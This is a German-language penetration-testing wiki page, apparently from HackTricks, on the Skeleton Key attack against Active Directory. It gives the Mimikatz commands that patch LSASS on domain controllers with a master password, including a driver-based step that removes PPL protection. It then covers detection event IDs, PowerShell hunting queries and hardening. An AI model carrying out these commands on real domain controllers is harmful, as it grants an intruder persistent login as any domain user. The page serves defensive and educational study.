# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

Die **Skeleton Key attack** ist eine Technik, die es Angreifern ermöglicht, die **Authentifizierung von Active Directory** zu umgehen, indem sie ein **Master-Passwort** in den LSASS-Prozess jedes Domänencontrollers injizieren. Nach der Injektion kann das Master-Passwort (Standard **`mimikatz`**) verwendet werden, um sich als **beliebiger Domänenbenutzer** zu authentifizieren, während deren echte Passwörter weiterhin funktionieren.

Key facts:

- Erfordert **Domain Admin/SYSTEM + SeDebugPrivilege** auf jedem DC und muss **nach jedem Neustart erneut angewendet** werden.
- Patcht die Validierungspfade für **NTLM** und **Kerberos RC4 (etype 0x17)**; reine **AES**-Reiche oder Konten, die AES erzwingen, werden **den skeleton key nicht akzeptieren**.
- Kann mit Drittanbieter‑LSA‑Authentifizierungspaketen oder zusätzlichen Smart‑Card / MFA‑Providern in Konflikt stehen.
- Das Mimikatz‑Modul akzeptiert den optionalen Schalter `/letaes`, um Kerberos/AES‑Hooks bei Kompatibilitätsproblemen nicht zu berühren.

### Ausführung

Klassisches, nicht‑PPL geschütztes LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Wenn **LSASS als PPL läuft** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), wird ein Kernel-Treiber benötigt, um den Schutz zu entfernen, bevor LSASS gepatcht wird:
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Nach der Injektion mit einem beliebigen Domänenkonto authentifizieren, dabei jedoch das Passwort `mimikatz` (oder den vom Betreiber gesetzten Wert) verwenden. Denken Sie daran, dies in **allen DCs** in Multi‑DC‑Umgebungen zu wiederholen.

## Gegenmaßnahmen

- **Protokollüberwachung**
- System **Ereignis‑ID 7045** (Service/Treiber‑Installation) für nicht signierte Treiber wie `mimidrv.sys`.
- **Sysmon**: Ereignis‑ID 7 (Treiberladung) für `mimidrv.sys`; Ereignis‑ID 10 für verdächtigen Zugriff auf `lsass.exe` durch Nicht‑System‑Prozesse.
- Sicherheits **Ereignis‑ID 4673/4611** für die Nutzung sensibler Privilegien oder Anomalien bei der Registrierung von LSA‑Authentifizierungspaketen; korrelieren Sie dies mit unerwarteten 4624‑Anmeldungen, die RC4 (etype 0x17) von DCs verwenden.
- **LSASS‑Härtung**
- Halten Sie **RunAsPPL/Credential Guard/Secure LSASS** auf DCs aktiviert, um Angreifer zur Bereitstellung eines Kernel‑Mode‑Treibers zu zwingen (mehr Telemetrie, schwerere Ausnutzung).
- Deaktivieren Sie veraltetes **RC4** wo möglich; auf AES beschränkte Kerberos‑Tickets verhindern den RC4‑Hook‑Pfad, den der skeleton key verwendet.
- Kurze PowerShell‑Suchen:
- Nicht signierte Kernel‑Treiber‑Installationen erkennen: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Nach Mimikatz‑Treiber suchen: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Überprüfen, ob PPL nach dem Neustart durchgesetzt wird: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Für zusätzliche Hinweise zur Härtung von Anmeldeinformationen siehe [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## Quellen

- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
